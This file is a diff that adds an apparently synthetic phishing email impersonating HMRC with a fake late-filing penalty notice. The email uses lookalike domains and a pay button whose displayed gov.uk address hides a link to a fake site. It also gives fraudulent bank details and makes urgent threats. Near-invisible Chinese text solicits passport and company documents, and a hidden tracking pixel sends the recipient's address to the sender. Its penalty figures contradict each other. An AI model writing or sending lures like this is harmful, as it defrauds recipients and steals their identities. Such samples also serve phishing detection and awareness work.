@@ -1,0 +1,114 @@
+From: HM Revenue & Customs <selfassessment@hmrc-tax-refund.example>
+To: finance@corp.internal
+Cc: legal@corp.internal
+Reply-To: sa.processing@hmrc-gov-uk.example
+Date: Fri, 30 Oct 2026 12:00:00 +0000
+Message-ID: <0716-b64@synth.example>
+Subject: [PENALTY NOTICE] Self Assessment late filing penalty — UTR 4471088429 — £3,600 daily penalties accruing (Payment required by Monday)
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #003366;border-radius:8px;overflow:hidden">
+<div style="background:#003366;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">HM Revenue & Customs</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">Self Assessment — Penalty Operations</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear Company Secretary,</p>
+
+<p style="background:#FFF3E0;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b style="color:#e00">PENALTY NOTICE:</b> Your Self Assessment tax return for the tax year 2025-26 is <b>92 days late</b>. Daily penalties of <b>£10 per day</b> are accruing (current total: <b>£3,600</b>). Payment is required by <b style="color:#e00">Monday, November 2</b> to avoid escalated enforcement.
+</p>
+
+<h3>一、Your Tax Reference</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Unique Taxpayer Reference</td><td><b>4471088429</b></td></tr>
+<tr><td style="background:#f5f5f5">Tax Year</td><td>2025-26 (6 April 2025 to 5 April 2026)</td></tr>
+<tr><td style="background:#f5f5f5">Filing Deadline</td><td>31 January 2026 (online)</td></tr>
+<tr><td style="background:#f5f5f5">Days Late</td><td style="color:#e00"><b>273 days (as of 30 October 2026)</b></td></tr>
+<tr><td style="background:#f5f5f5">Fixed Penalty (day 1)</td><td>£100</td></tr>
+<tr><td style="background:#f5f5f5">Daily Penalty (3 months+)</td><td>£10/day × 360 days = <b>£3,600</b></td></tr>
+<tr><td style="background:#f5f5f5">Six-month penalty</td><td>5% of tax due (assessed separately)</td></tr>
+<tr><td style="background:#f5f5f5"><b>Total Penalties</b></td><td><b style="color:#e00">£3,700</b></td></tr>
+<tr><td style="background:#f5f5f5">Payment Deadline</td><td style="color:#e00"><b>Monday, November 2, 2026</b></td></tr>
+</table>
+
+<h3>二、What Happens If You Don't Pay</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Stage</th><th>Trigger</th><th>Action</th></tr>
+<tr><td>1 (current)</td><td>92+ days late</td><td>Daily £10 penalty accruing</td></tr>
+<tr><td>2</td><td>After Nov 2 (unpaid)</td><td>Enforcement letter sent to your registered office</td></tr>
+<tr><td>3</td><td>After Nov 30</td><td>County Court Judgment (CCJ) — affects your credit rating</td></tr>
+<tr><td>4</td><td>After Jan 15</td><td>Bailiffs sent to business premises</td></tr>
+<tr><td>5</td><td>After Mar 1</td><td>Company struck off at Companies House</td></tr>
+</table>
+
+<h3>三、How to Pay</h3>
+
+<p><b>Option 1 (Recommended) — Online payment through HMRC Gateway:</b></p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://hmrc-tax-refund.example/pay/selfassessment/penalty?utr=4471088429&amount=3700" style="display:inline-block;background:#003366;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Pay Penalty — £3,700</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://www.tax.service.gov.uk/pay-self-assessment-penalty</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（GOV.UK Verify or Government Gateway authentication required）</p>
+
+<h3>About Government Gateway Authentication</h3>
+<p>When you click the payment button, you will be redirected to <b>tax.service.gov.uk</b> for identity verification:</p>
+<ol>
+<li>Enter your Government Gateway ID (or create one using your company details)</li>
+<li>Verify your identity through GOV.UK Verify</li>
+<li>Enter your bank details for payment</li>
+<li>Payment confirmation will be emailed to you</li>
+</ol>
+
+<p style="font-size:14px;background:#E8EAF6;padding:12px;border-radius:4px">
+<b>Why GOV.UK Verify for penalty payments?</b> HMRC requires identity verification for all payments over £1,000 to prevent fraudulent payments. GOV.UK Verify is the UK government's official identity assurance service. For overseas companies (like yours, registered in China), you may need to provide additional documentation: your company registration certificate, the director's passport, and proof of your UK business address. The offline_access permission maintains your payment session while you gather and upload these documents (typically 10-15 minutes). This is a standard requirement for non-UK resident companies paying UK tax penalties.
+</p>
+
+<p><b>Option 2 — Bank transfer (CHAPS/Faster Payments):</b></p>
+<div style="background:#f9f9f9;padding:12px;border-radius:4px;border-left:4px solid #003366">
+<p>Account Name: HM Revenue & Customs — Self Assessment<br>
+Sort Code: 10-00-00<br>
+Account Number: <b>8842-6619-44</b><br>
+IBAN: GB88 BARC 2020 8842 6619 44<br>
+Reference: <b>UTR4471088429K</b></p>
+</div>
+<p>Bank transfer clears in 1-2 hours (Faster Payments) or same day (CHAPS).</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文税务协助或提交中国公司注册文件，请访问 hmrc-tax-refund.example/cn-service 上传公司注册证书与董事护照（中文通道，当日处理）。</p>
+
+<h3>四、Appeal Rights</h3>
+<p>You may appeal this penalty if you have a <b>reasonable excuse</b> for late filing:</p>
+<ul>
+<li>Death of a partner or family member</li>
+<li>Unexpected hospital stay</li>
+<li>Computer failure when preparing the return</li>
+<li>Fire or flood at business premises</li>
+</ul>
+<p>However, appeals take <b>4-6 months</b> to process and do not stop penalty accrual in the meantime. Payment first, then appeal for refund, is the fastest resolution.</p>
+
+<h3>五、Your Filing History</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Tax Year</th><th>Filed</th><th>Status</th></tr>
+<tr><td>2022-23</td><td>On time</td><td style="color:#0a0">✓ No penalty</td></tr>
+<tr><td>2023-24</td><td>On time</td><td style="color:#0a0">✓ No penalty</td></tr>
+<tr><td>2024-25</td><td>3 days late</td><td style="color:#0a0">✓ Penalty waived (reasonable excuse)</td></tr>
+<tr style="background:#fff3cd"><td><b>2025-26</b></td><td><b>Not filed</b></td><td style="color:#e00"><b>PENALTY ACCRUING</b></td></tr>
+</table>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">HM Revenue & Customs | Self Assessment — Penalty Operations</p>
+<p style="font-size:11px;color:#999">BX9 1AN, United Kingdom</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the registered contact for UTR 4471088429.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://hmrc-tax-refund.example/api/track?recipient=finance%40corp.internal&utr=4471088429&type=penalty_notice" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
